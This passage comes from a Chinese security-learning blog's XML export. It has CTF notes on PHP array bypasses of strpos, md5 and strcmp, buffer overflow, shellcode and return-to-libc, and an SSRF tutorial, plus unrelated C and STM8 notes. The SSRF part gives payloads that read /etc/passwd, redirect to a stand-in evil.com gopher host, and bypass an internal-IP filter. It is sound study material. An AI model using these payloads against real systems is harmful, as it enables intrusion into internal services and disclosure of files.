<li><p>如果一个指针不指向任何数据，我们就称之为空指针，用 NULL 表示。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> NULL ((void *)0)</span></code></pre>
</li>
<li><p>地址 0 通常是一个不被使用的地址。所以，如果一个指针指向 NULL，那么就意味着该指针不指向任何东西。</p>
</li>
<li><p><font color="red">当你还不清楚要将指针初始化为什么地址时，请将它初始化 NULL；在对指针进行解引用时，先检查该指针是否为 NULL。这种策略可以为你今后编写大型程序节省大量的调试时间。</font></p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Hello</title>
    <url>/2019/10/25/Hello/</url>
    <content><![CDATA[<h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p><font color="green">你好，我是九九，ID：Doublenine。来自GDUT<br></font></p>
<a id="more"></a>

<p>想开始写博客，为了记录一下自己的所学所见，也为了督促自己学习。</p>
<hr>
<p><strong>希望你能多多支持我！</strong></p>
]]></content>
  </entry>
  <entry>
    <title>PHP数组绕过</title>
    <url>/2019/10/27/PHP%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="PHP数组绕过"><a href="#PHP数组绕过" class="headerlink" title="PHP数组绕过"></a>PHP数组绕过</h2><h3 id="绕过strops-函数"><a href="#绕过strops-函数" class="headerlink" title="绕过strops()函数"></a>绕过strops()函数</h3><p><font color="green"><strong>1. strops()定义：</strong></font></p>
<p>strpos() 函数查找字符串在另一字符串中<strong>第一次</strong>出现的<strong>位置</strong>。</p>
<a id="more"></a>

<blockquote>
<p>strpos() 函数对大小写敏感。</p>
</blockquote>
<p><font color="green"><strong>2. strops()语法：</strong></font></p>
<pre><code>strpos(string,find,start)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td>find</td>
<td>必需。规定要查找的字符串。</td>
</tr>
<tr>
<td>start</td>
<td>可选。规定从何处开始搜索。</td>
</tr>
</tbody></table>
<ul>
<li><strong>返回值：    返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</strong></li>
</ul>
<blockquote>
<p>字符串位置从 0 开始，不是从 1 开始。</p>
</blockquote>
<hr>
<h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li>它<strong>不能对数组处理</strong>，如果是数组则返回null,null，也就不等于FALSE。</li>
</ul>
<p>下面用南邮的一道ctf题举例：</p>
<pre><code>&lt;?php

$flag = &quot;flag&quot;;

    if (isset ($_GET[&#39;nctf&#39;])) {
        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
            echo &#39;必须输入数字才行&#39;;
        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
            die(&#39;Flag: &#39;.$flag);
        else
            echo &#39;骚年，继续努力吧啊~&#39;;
    }

 ?&gt;</code></pre><p>这里首先看到的是get传参nctf，然后必须是数字，最后需要绕过strpos()函数</p>
<pre><code>payload: ?ctf[]=1</code></pre><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=1" target="_blank" rel="noopener">即可得到flag</a></p>
<hr>
<h3 id="绕过md5-函数判断"><a href="#绕过md5-函数判断" class="headerlink" title="绕过md5()函数判断"></a>绕过md5()函数判断</h3><p><font color="green"><strong>1. md5()定义：</strong></font></p>
<ul>
<li>md5() 函数计算字符串的 MD5 散列。</li>
</ul>
<p><font color="green"><strong>2. md5()语法：</strong></font></p>
<pre><code>md5(string,raw)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要计算的字符串。</td>
</tr>
<tr>
<td>raw</td>
<td>可选。规定十六进制或二进制输出格式</td>
</tr>
</tbody></table>
<ul>
<li>返回值：    <strong>如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE</strong>。</li>
</ul>
<hr>
<p>二话不说直接看例子</p>
<pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) {
if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;])
if (md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;]))
die(&#39;Flag: &#39;.$flag);
else
print &#39;Wrong.&#39;;
}</code></pre><p><font color="red">要得到flag我们需满足三个if条件：</font></p>
<p><strong>1. 同时传入a和b</strong></p>
<p><strong>2. a和b的值不能等</strong></p>
<p><strong>3. a和b的md5值需相等</strong></p>
<h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li>md5()函数无法处理数组，<strong>如果传入的为数组，会返回NULL</strong>，<font color="green">所以两个数组经过加密后得到的都是NULL,也就是相等的。</font></li>
</ul>
<p>所以构造poc:</p>
<pre><code>?a[]=0&amp;b[]=1</code></pre><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=0&b[]=1" target="_blank" rel="noopener">即可得到flag</a></p>
<hr>
<h3 id="绕过strcmp-函数"><a href="#绕过strcmp-函数" class="headerlink" title="绕过strcmp()函数"></a>绕过strcmp()函数</h3><p><font color="green"><strong>1. strcmp()定义：</strong></font></p>
<ul>
<li>strcmp() 函数比较两个字符串。</li>
</ul>
<blockquote>
<p>strcmp() 函数是二进制安全的，且对大小写敏感。</p>
</blockquote>
<p><font color="green"><strong>2. strcmp()语法：</strong></font></p>
<pre><code>strcmp(string1,string2)</code></pre><table>
<thead>
<tr>
<th>string1</th>
<th>string2</th>
</tr>
</thead>
<tbody><tr>
<td>string1</td>
<td>必需。规定要比较的第一个字符串。</td>
</tr>
<tr>
<td>string2</td>
<td>必需。规定要比较的第二个字符串。</td>
</tr>
</tbody></table>
<ul>
<li>返回值：</li>
</ul>
<ol>
<li>如果两个字符串相等，返回0</li>
<li>如果string1 &lt; string2，返回 &lt;0 </li>
<li>如果string1 &lt; string2, 返回 &gt;0</li>
</ol>
<hr>
<h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><ul>
<li><strong>5.2</strong>中 是将两个参数先<strong>转换成string类型</strong>。</li>
<li><strong>5.3.3</strong>以后，当<strong>比较数组和字符串</strong>的时候，返回是0。</li>
<li><strong>5.5</strong>中 如果参数<strong>不是string类型，直接return</strong></li>
</ul>
<p>所以会出现三种情形：</p>
<pre><code>strcmp(&quot;foo&quot;, array()) =&gt; NULL + PHP Warning

strcmp(&quot;foo&quot;, new stdClass) =&gt; NULL + PHP Warning

strcmp(function(){}, &quot;&quot;) =&gt; NULL + PHP Warning</code></pre><p>举例：</p>
<pre><code>$pass=@$_POST[&#39;pass&#39;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo &quot;flag:nctf{*}&quot;;
}else{
echo &quot;the pass is wrong!&quot;;
}
}else{
echo &quot;please input pass!&quot;;
}
?&gt;</code></pre><p>构造poc：</p>
<pre><code>pass[]=aa  //通过post提交</code></pre><p>即可绕过strcmp()函数</p>
<hr>
]]></content>
      <categories>
        <category>PHP</category>
        <category>CTF</category>
        <category>WEB安全</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN笔记（一）</title>
    <url>/2019/10/26/PWN%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h2 id="一、缓存区溢出条件："><a href="#一、缓存区溢出条件：" class="headerlink" title="一、缓存区溢出条件："></a>一、缓存区溢出条件：</h2><ul>
<li>1.程序有向栈写入数据的行为</li>
<li>2.程序不限制写入数据的长度；</li>
</ul>
<a id="more"></a>

<h2 id="二、函数调用栈"><a href="#二、函数调用栈" class="headerlink" title="二、函数调用栈"></a>二、函数调用栈</h2><ul>
<li><p>1.调用函数在栈内，被调用函数在栈顶。<br>调用结束后被调用函数被弹出，栈顶恢复到调用函数的状态</p>
</li>
<li><p>2.<strong>esp</strong> –&gt; 用来存储函数调用栈的==栈顶地址==（在压栈退栈中变化）</p>
</li>
<li><p>  <strong>ebp</strong> –&gt; 用来存储当前函数状态的==基地址==，在函数运行时不变，可以用来索引确定函数参数和局部变量的位置</p>
<p>  <strong>eip</strong> –&gt; 用来存储即将执行的程序指令的地址（CPU依照eip的存储内容读取指令并执行）</p>
</li>
<li><p>3</p>
</li>
</ul>
<p><strong>发生函数调用的核心任务</strong>是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态</p>
<ul>
<li><p>将被调用函数的参数逆序压入栈内，这些参数会保存在caller的状态里，之后压入的数据会作为callee处理 –&gt; 压入被调用函数的返回地址 –&gt; 压入caller的ebp，并更新ebp的值为栈顶的返回地址 –&gt;<br>将callee的局部变量压入栈内</p>
<blockquote>
<p>PS:调用参数以外的数据构成了callee的状态</p>
</blockquote>
<p><strong>函数调用结束的核心任务</strong>是丢弃被调用函数(callee)的状态，并将栈顶恢复为调用函数(caller)的状态</p>
</li>
<li><p>将局部变量弹出，栈顶指向callee的基地址 –&gt;<br>将基地址内存储的调用函数caller的基地址弹出并存到ebp寄存器内，caller的ebp信息恢复，栈顶指向callee的返回地址 –&gt;<br>将返回地址弹出，caller的eip信息恢复</p>
</li>
</ul>
<h2 id="三、栈攻击溢出"><a href="#三、栈攻击溢出" class="headerlink" title="三、栈攻击溢出"></a>三、栈攻击溢出</h2><ul>
<li>1.最关键：eip寄存器（载入攻击命令的地址）</li>
</ul>
<pre><code>&gt; 结束函数调用时
  核心目的：用攻击指令的地址来覆盖返回地址

&gt; 函数调用发生时
eip会指向原程序中的某个指定函数
手段：“偷梁换柱” ---  将原本指定的函数在调用时替换为其他函数</code></pre><hr>
<p>shellcode：修改返回地址，让其指向溢出数据的一段指令</p>
<p>return2libc：修改返回地址，让其指向内存中已有的某个函数</p>
<p>ROP：修改返回地址，让其指向内存中已有的一段指令</p>
<p>hijack GOT：修改某个被调用函数的地址，让其指向另一个函数</p>
<hr>
<h2 id="四、Shellcode"><a href="#四、Shellcode" class="headerlink" title="四、Shellcode"></a>四、Shellcode</h2><p>（–修改返回地址，让其指向溢出数据的一段指令–）</p>
<ul>
<li>溢出数据的构造<br>padding1 + address of shellcode + padding2 +shellcode</li>
</ul>
<ul>
<li>padding1处的数据可以随意填充（如果利用==字符串==程序输入溢出数据不要包含”\x00”，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<br>address of shellcode是后面shellcode起始处的地址，用来覆盖返回地址。<br>padding2处的数据也可以随意填充，长度任意。shellcode应该为十六进制的机器码格式</li>
</ul>
<hr>
<ul>
<li>返回地址之前的填充数据（padding1）应该多长？</li>
</ul>
<blockquote>
<p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p>
</blockquote>
<ul>
<li>shellcode起始地址应该是多少？</li>
</ul>
<blockquote>
<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
</blockquote>
<blockquote>
<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
</blockquote>
<blockquote>
<p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p>
</blockquote>
<h2 id="五、Return2libc"><a href="#五、Return2libc" class="headerlink" title="五、Return2libc"></a>五、Return2libc</h2><p>（–修改返回地址，让其指向内存中已有的某个函数–）</p>
<ul>
<li>1.要在内存中确定某个函数的地址，并用其覆盖掉返回地址。</li>
</ul>
<blockquote>
<p>主要关注libc动态链接库，该库包含了一些系统级的函数（如system()等），从而利用这些系统级函数来获得当前进程的控制权。<br>下面以system(“/bin/sh”)为例</p>
</blockquote>
<ul>
<li><p>2.payload:padding1 + address of system() + padding2 + address of “/bin/sh”</p>
</li>
<li><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
</li>
</ul>
<hr>
<ul>
<li>返回地址之前的填充数据（padding1）应该多长？</li>
</ul>
<blockquote>
<p>解决方法和 shellcode 中提到的答案一样。</p>
</blockquote>
<ul>
<li>system() 函数地址应该是多少？</li>
</ul>
<blockquote>
<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
</blockquote>
<ul>
<li>最后，“/bin/sh” 的地址在哪里？</li>
</ul>
<blockquote>
<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
</blockquote>
<hr>
<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞浅析</title>
    <url>/2019/10/26/SSRF%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到的数据限制。</li>
</ul>
<a id="more"></a>

<ul>
<li>一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，<font color="red">所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人</font>）</li>
<li>SSRF 形成的原因大都是由于<font color="green">服务端</font>提供了从其他服务器应用获取数据的功能，且没有对目标地址做<font color="green">过滤与限制</font>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li>
</ul>
<blockquote>
<p>比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。<br>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做<font color="red">中间人</font>，访问b网站，从而达到攻击b网站需求。</p>
</blockquote>
<hr>
<p>通过修改http头让a.com去访问b.com：</p>
<pre><code>GET /?url=http://b.com/HTTP/1.1

HOST: a.com
</code></pre><hr>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol>
<li>内外网的端口和服务扫描</li>
<li>主机本地敏感数据的读取（通过 url scheme (file:///, dict://, ftp://, gopher:// …) 读取内部资源或者让服务执行相应的动作)</li>
<li>内外网主机应用程序漏洞的利用</li>
<li>内外网Web站点的漏洞利用</li>
<li>反射XSS</li>
</ol>
<p>……</p>
<blockquote>
<p>故此ssrf一般评级为<font color="red">中高危</font>漏洞</p>
</blockquote>
<hr>
<h2 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h2><ul>
<li>正常用户访问网站的流程是：</li>
</ul>
<p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p>
<p>【那网站有个请求是<a href="http://www.baidu.com/xxx.php?image=URL】" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=URL】</a></p>
<ul>
<li>那么产生SSRF漏洞的环节在哪里呢？<font color="red">安全的网站应接收请求后，检测请求的合法性</font></li>
</ul>
<p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p>
<p>例如</p>
<pre><code>www.baidu.com/xxx.php?image=www.abc.com/1.jpg</code></pre><ul>
<li>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></li>
</ul>
<blockquote>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
</blockquote>
<p>简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后<font color="blue">服务器以他的身份来访问其他服务器的资源。</font></p>
<hr>
<h2 id="SSRF产生反射型XSS"><a href="#SSRF产生反射型XSS" class="headerlink" title="SSRF产生反射型XSS"></a><font color="green">SSRF产生反射型XSS</font></h2><p>简单的从外部网站获取一个恶意payload，并且响应类型是html格式，如：</p>
<pre><code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></pre><h2 id="利用协议进行信息探测"><a href="#利用协议进行信息探测" class="headerlink" title="利用协议进行信息探测"></a><font color="green">利用协议进行信息探测</font></h2><ul>
<li>当找到一个 SSRF 时，第一件事情就是测试对应可支持的 url scheme，如：</li>
</ul>
<ol>
<li>file://</li>
<li>dict://</li>
<li>sftp://</li>
<li>ldap://</li>
<li>tftp://</li>
<li>gopher://</li>
</ol>
<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>File模式用于从文件系统中获取内容</p>
<pre><code>http://example.com/ssrf.php?url=file:///etc/passwd

http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></pre><h3 id="dic"><a href="#dic" class="headerlink" title="dic://"></a>dic://</h3><p>当服务端禁止或者只允许白名单从外部网站请求资源，你可以通过 dic:// 模式来发送一个请求</p>
<blockquote>
<p>dict协议是一个<font color="green">字典服务器协议</font>，通常用于让客户端使用过程中能够访问更多的字典源</p>
</blockquote>
<p>DICT URL scheme 通过 DICT 协议引入定义或者可用的单词列表:</p>
<pre><code>http://example.com/ssrf.php?dict://ad.com:1337/</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp://"></a>sftp://</h3><p>Sftp 是一个 SSH 文件传输协议或安全文件传输协议，和 SSH 打包在一起的单独协议，和 ssh 一样都是通过安全连接进行通信。</p>
<pre><code>http://example.com/ssrf.php?url=sftp://ad.com:1337/</code></pre><h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h3><p>ftfp 用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。</p>
<pre><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code></pre><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher 是一个分布式文档传输服务，允许用户以无缝的方式针对放在不同位置的文档进行浏览、查询、获取。</p>
<pre><code>http://example.com/ssrf.php?url=http://ad.com/gopher.php</code></pre><p>gopher.php (host it on ad.com):</p>
<pre><code>&lt;?php
  header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);
?&gt;</code></pre><p>PS: <font color="red">在php中要使用gopher协议需要curl的支持</font></p>
<hr>
<p>这里我用一道ctf的题目来说，题目如下：</p>
<pre><code>&lt;?php

function check_inner_ip($url)
{
    $match_result=preg_match(&#39;/^(http|https)?:\/\/.*(\/)?.*$/&#39;,$url);
    if (!$match_result)
    {
        die(&#39;url fomat error1&#39;);
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die(&#39;url fomat error2&#39;);
    }
    $hostname=$url_parse[&#39;host&#39;];
    echo $url_parse[&#39;host&#39;];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long(&#39;0.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.&#39; is inner ip&#39;;
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info[&#39;redirect_url&#39;])
        {
            safe_request_url($result_info[&#39;redirect_url&#39;]);
        }
        curl_close($ch);
        var_dump($output);
    }

}

$url = $_POST[&#39;url&#39;];
if(!empty($url)){
    safe_request_url($url);
}
else{
    highlight_file(__file__);
}

//hint23333:
//flag in flag.php
//phpinfo in phpinfo.php

?&gt; </code></pre><p><font color="red">check_inner_ip</font> 通过 <font color="red">url_parse</font> 检测是否为内网 ip 。</p>
<p>如果满足不是内网 ip ，通过 <font color="red">curl </font>请求 url 返回结果。</p>
<p>乍一看好像并没有利用点，跳转也做了处理，最终都要经过 check_inner_ip 函数检测。但是忽略了 php_url_parse 和 curl 同时处理 url 不同。</p>
<p>当处理这个地址</p>
<pre><code>http://foo@example.com:80@google.com/</code></pre><p><font color="red">curl</font> 和<font color="red"> php_url_parse</font> 处理后最终的目标不一样</p>
<hr>
<p>分析一下代码逻辑，检测是否内网 ip 通过 parse_url，而最后请求是用 curl 完成的。当遇到上面的 url 格式时，parse_url 判断的是第二个 @ 后接的地址，curl 请求的是第一个。</p>
<p>于是利用思路就有了，让 parse_url 处理外部网站，最后 curl 请求内网网址。</p>
<p>构造 payload：</p>
<pre><code>http://foo@127.0.0.1:80 @www.baidu.com/flag.php</code></pre><p>可查询到本地的文件flag.php</p>
<blockquote>
<p>这个空格是为了绕过curl团队给出的一个补丁</p>
</blockquote>
<h2 id="漏洞常见位置"><a href="#漏洞常见位置" class="headerlink" title="漏洞常见位置"></a>漏洞常见位置</h2><ul>
<li>我觉得所有调外部资源的参数都有可能存在ssrf漏洞</li>
</ul>
<p>1）分享：通过URL地址分享网页内容</p>
<p>2）转码服务</p>
<p>3）在线翻译</p>
<p>4）图片加载与下载：通过URL地址加载或下载图片</p>
<p>5）图片、文章收藏功能</p>
<p>6）未公开的api实现以及其他调用URL的功能</p>
<p>7）从URL关键字中寻找：</p>
<pre><code>share
wap
url
link
src
source
target
u
3g
display
sourceURl
imageURL
domain
...</code></pre><h2 id="验证方法"><a href="#验证方法" class="headerlink" title="验证方法"></a>验证方法</h2><ul>
<li><p>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
</li>
<li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>STM8单片机</title>
    <url>/2020/05/05/STM8%E5%8D%95%E7%89%87%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="STM8单片机笔记"><a href="#STM8单片机笔记" class="headerlink" title="STM8单片机笔记"></a>STM8单片机笔记</h1><p>[Toc]</p>
<hr>
<h2 id="单片机的概念"><a href="#单片机的概念" class="headerlink" title="单片机的概念"></a>单片机的概念</h2><ul>
<li>1.单片机是微型计算机的分支，是在一块芯片上集成了CPU、内存（RAM）、程序储存器（ROM）、输入输出接口的微型计算机。</li>
</ul>
<blockquote>
<p>早期的单片机为8位或4位，随着工业控制的要求提高，出现了16位的单片机，目前更是出现了32位的单片机。</p>
</blockquote>
<blockquote>
<p>高端单片机可直接使用专用的window、linux或其他嵌入式操作系统。</p>
</blockquote>
<ul>
<li>2.单片机的<font color="red">优点</font> :高可靠性、高性价比、低电压、低功耗</li>
</ul>
<blockquote>
<p>单片机广泛运用于工业控制系统</p>
</blockquote>
<blockquote>
<p>单片机数量十分庞大，生活中处处都有单片机存在</p>
</blockquote>
<blockquote>
<p>应用例子：医疗电子、安防报警、汽车电子、电机控制、智能仪表、工业控制、智能电子玩具、办公自动化设备</p>
</blockquote>
<ul>
<li>3.STM单片机型号</li>
</ul>
<blockquote>
<p>STM8S20xx主要型号:<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749575402&di=63e52bc718cc5a77f75271e9b538c31e&imgtype=0&src=http%3A%2F%2Fs14.sinaimg.cn%2Fmw690%2F002F0M5izy76RQbY8Tb0d" alt></p>
</blockquote>
<ul>
<li>4.STM8S20xxx系统框图<br><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538749833676&di=1617d25ac9637ef6da727a4cb84ffcf9&imgtype=0&src=http%3A%2F%2Fwww.iot-online.com%2Fuploads%2Fallimg%2F170303%2F1159335D8_0.jpg" alt></li>
</ul>
<hr>
<hr>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>STVD开发环境+CXSTM8编译器</li>
<li>最小系统板，如：STM8S208RBT6</li>
</ul>
<blockquote>
<p><font color="red">注意在6脚VACP和地之间必须接一个去耦电容，不要使用电解电容</font></p>
</blockquote>
<ul>
<li>显示模块</li>
<li>按键输入模块</li>
</ul>
<hr>
<ul>
<li>USB转串口下载线</li>
<li>ST-Link仿真器</li>
</ul>
<hr>
<ul>
<li>古老神灯闪烁实验</li>
</ul>
<hr>
<hr>
<h2 id="I-O口的应用"><a href="#I-O口的应用" class="headerlink" title="I/O口的应用"></a>I/O口的应用</h2><ul>
<li>I/O口的”五器”</li>
</ul>
<blockquote>
<p>1.输出数据寄存器(ODR)、输入引脚寄存器(IDR)、数据方向寄存器(DDR)、控制寄存器1(CR1)、控制寄存器2(CR2)</p>
</blockquote>
<ul>
<li>当Px_DDRn为”1”,对应的Pxn配置为输出；当Px_DDRn为”0”,对应的Pxn配置为输入。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>php反序列化学习</title>
    <url>/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞学习（一）"><a href="#PHP反序列化漏洞学习（一）" class="headerlink" title="PHP反序列化漏洞学习（一）"></a>PHP反序列化漏洞学习（一）</h1><h2 id="概念"><a href="#概念" class="headerlink" title=" 概念"></a><font color="green"> 概念</font></h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><ul>
<li><p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
</li>
<li><p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
</li>
</ul>
<p>测试代码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
